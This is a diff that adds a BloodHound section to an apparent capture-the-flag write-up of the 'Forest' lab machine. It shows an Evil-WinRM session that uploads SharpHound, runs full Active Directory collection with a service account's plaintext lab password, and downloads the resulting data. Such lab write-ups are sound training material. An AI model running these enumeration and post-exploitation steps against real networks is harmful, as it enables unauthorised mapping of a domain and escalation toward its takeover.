@@ -187,6 +187,36 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
 ```
+
+## BloodHound
+```markdown
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1
+Info: Uploading /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1                                                                                   
+
+Data: 1226060 bytes of 1226060 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -DomainController Forest.htb.local
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        1/23/2020   1:13 AM          12930 20200123011306_BloodHound.zip                                                                                                                                                                           
+-a----        1/23/2020   1:13 AM           9028 Rk9SRVNU.bin                                                                                                                                                                                            
+-a----        1/23/2020   1:10 AM         919546 SharpHound.ps1                                                                                                                                                                                          
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200123011306_BloodHound.zip
+Info: Downloading C:\Users\svc-alfresco\Documents\20200123011306_BloodHound.zip to 20200123011306_BloodHound.zip                                                                                            
+
+Info: Download successful!
+```
 ## Resources:
 
 https://securityonline.info/aclpwn/
